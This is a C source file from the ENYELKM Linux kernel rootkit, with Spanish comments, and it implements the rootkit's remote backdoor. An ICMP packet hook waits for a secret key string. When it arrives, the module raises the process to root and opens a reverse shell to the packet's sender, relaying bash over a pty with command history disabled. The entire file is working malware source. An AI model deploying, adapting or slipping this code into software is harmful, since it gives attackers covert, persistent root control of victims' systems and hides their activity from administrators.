/*
 * ENYELKM v1.1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe & David Reguera Garc�a
 * < raise@enye-sec.org 
 * http://www.enye-sec.org >
 *
 * davidregar@yahoo.es - http://www.fr33project.org
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/netdevice.h>
#include <linux/dirent.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/ioctls.h>
#include <asm/termbits.h>
#include "config.h"
#include "remoto.h"

#define __NR_e_exit __NR_exit


/* variables globales */
static char *earg[4] = { "/bin/bash", "--noprofile", "--norc", NULL };
extern short lanzar_shell;
extern int errno;
extern unsigned long global_ip;
extern unsigned short global_port;
int ptmx, epty;


/* variables de entorno */
char *env[]={
    "TERM=linux",
    "HOME=" HOME,
    "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin"
    ":/usr/local/sbin",
    "HISTFILE=/dev/null",
     NULL };


/* syscalls */
static inline _syscall2(int, kill, pid_t, pid, int, sig);
static inline _syscall1(int, chdir, const char *, path);
static inline _syscall3(int, write, int, fd, const char *, buf, off_t, count);
static inline _syscall3(int, read, int, fd, char *, buf, off_t, count);
static inline _syscall1(int, e_exit, int, exitcode);
static inline _syscall3(int, open, const char *, file, int, flag, int, mode);
static inline _syscall1(int, close, int, fd);
static inline _syscall2(int, dup2, int, oldfd, int, newfd);
static inline _syscall2(int, socketcall, int, call, unsigned long *, args);
static inline _syscall3(int, execve, const char *, filename,
	const char **, argv, const char **, envp);
static inline _syscall3(long, ioctl, unsigned int, fd, unsigned int, cmd,
	unsigned long, arg);
static inline _syscall5(int, _newselect, int, n, fd_set *, readfds, fd_set *,
	writefds, fd_set *, exceptfds, struct timeval *, timeout);

/* do_fork */
extern long (*my_do_fork)(unsigned long clone_flags,
	          unsigned long stack_start,
	          struct pt_regs *regs,
	          unsigned long stack_size,
	          int __user *parent_tidptr,
	          int __user *child_tidptr);



int reverse_shell(void *ip)
{
struct task_struct *ptr = current;
struct sockaddr_in dire;
struct pt_regs regs;
mm_segment_t old_fs;
unsigned long arg[3];
int soc, tmp_pid;
unsigned char tmp;
fd_set s_read;


old_fs = get_fs();

ptr->uid = 0;
ptr->euid = 0;
ptr->gid = SGID;
ptr->egid = 0;

arg[0] = AF_INET;
arg[1] = SOCK_STREAM;
arg[2] = 0;

set_fs(KERNEL_DS);

if ((soc = socketcall(SYS_SOCKET, arg)) == -1)
	{
	set_fs(old_fs);
	lanzar_shell = 1;

    e_exit(-1);
	return(-1);
    }

memset((void *) &dire, 0, sizeof(dire));

dire.sin_family = AF_INET;
dire.sin_port = htons((unsigned short) global_port);
dire.sin_addr.s_addr = (unsigned long) global_ip;

arg[0] = soc;
arg[1] = (unsigned long) &dire;
arg[2] = (unsigned long) sizeof(dire);

if (socketcall(SYS_CONNECT, arg) == -1)
	{
	close(soc);
	set_fs(old_fs);
	lanzar_shell = 1;

	e_exit(-1);
	return(-1);
	}

/* pillamos tty */
epty = get_pty();

/* ejecutamos shell */
set_fs(old_fs);

memset(&regs, 0, sizeof(regs));
regs.xds = __USER_DS;
regs.xes = __USER_DS;
regs.orig_eax = -1;
regs.xcs = __KERNEL_CS;
regs.eflags = 0x286;
regs.eip = (unsigned long) ejecutar_shell;
tmp_pid = (*my_do_fork)(0, 0, &regs, 0, NULL, NULL);

set_fs(KERNEL_DS);


while(1)
	{
	FD_ZERO(&s_read);
	FD_SET(ptmx, &s_read);
	FD_SET(soc, &s_read);

	_newselect((ptmx > soc ? ptmx+1 : soc+1), &s_read, 0, 0, NULL);

	if (FD_ISSET(ptmx, &s_read))
		{
		if (read(ptmx, &tmp, 1) == 0)
			break;
		write(soc, &tmp, 1);
		}

	if (FD_ISSET(soc, &s_read))
		{
		if (read(soc, &tmp, 1) == 0)
			break;
		write(ptmx, &tmp, 1);
		}

	} /* fin while */


/* matamos el proceso */
kill(tmp_pid, SIGKILL);

/* salimos */
set_fs(old_fs);
e_exit(0);

return(-1);

} /********** fin reverse_shell **********/



int capturar(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,
				struct net_device *dev2)
{
unsigned short len;
char buf[256];
int i;

/* debe ser icmp */
if (skb->nh.iph->protocol != 1)
	{
	kfree_skb(skb);
	return(0);
	}

/* el icmp debe ser para nosotros */
if (skb->pkt_type != PACKET_HOST)
	{
	kfree_skb(skb);
	return(0);
	}

len = (unsigned short) skb->nh.iph->tot_len;
len = htons(len);

/* no es nuestro icmp */
if (len != (28 + strlen(ICMP_CLAVE) + sizeof(unsigned short)))
	{
	kfree_skb(skb);
	return(0);
	}

/* copiamos el packete */
memcpy (buf, (void *) skb->nh.iph, len);

/* borramos los null */
for (i=0; i < len; i++)
	if (buf[i] == 0)
		buf[i] = 1;
buf[len] = 0;

if(strstr(buf,ICMP_CLAVE) != NULL)
		{
		unsigned short *puerto;

		puerto = (unsigned short *)
					((void *)(strstr(buf,ICMP_CLAVE) + strlen(ICMP_CLAVE)));

		global_port = *puerto;
		global_ip = skb->nh.iph->saddr;

		lanzar_shell = 1;
		}

kfree_skb(skb);
return(0);

} /******** fin capturar() *********/



int get_pty(void)
{
char buf[128];
int npty, lock = 0;

ptmx = open("/dev/ptmx", O_RDWR, S_IRWXU);

/* pillamos pty libre */
ioctl(ptmx, TIOCGPTN, (unsigned long) &npty);

/* bloqueamos */
ioctl(ptmx, TIOCSPTLCK, (unsigned long) &lock);

/* abrimos pty */
sprintf(buf, "/dev/pts/%d", npty);
npty = open(buf, O_RDWR, S_IRWXU);

/* devolvemos el descriptor */
return(npty);

} /*************** fin de get_pty() **************/



void eco_off(void)
{
struct termios term;

ioctl(0, TCGETS, (unsigned long) &term);
term.c_lflag = term.c_lflag || CLOCAL;
ioctl(0, TCSETS, (unsigned long) &term);

} /************* fin de eco_off **************/



void ejecutar_shell(void)
{
struct task_struct *ptr = current;
mm_segment_t old_fs;

old_fs = get_fs();
set_fs(KERNEL_DS);

ptr->uid = 0;
ptr->euid = 0;
ptr->gid = SGID;
ptr->egid = 0;

/* dupeamos */
dup2(epty, 0);
dup2(epty, 1);
dup2(epty, 2);

/* quitamos eco */
eco_off();

/* cambiamos a home */
chdir(HOME);

execve(earg[0], (const char **) earg, (const char **) env);

/* salimos en caso de error */
e_exit(-1);

} /************ fin ejecutar_shell ***********/



/* EOF */
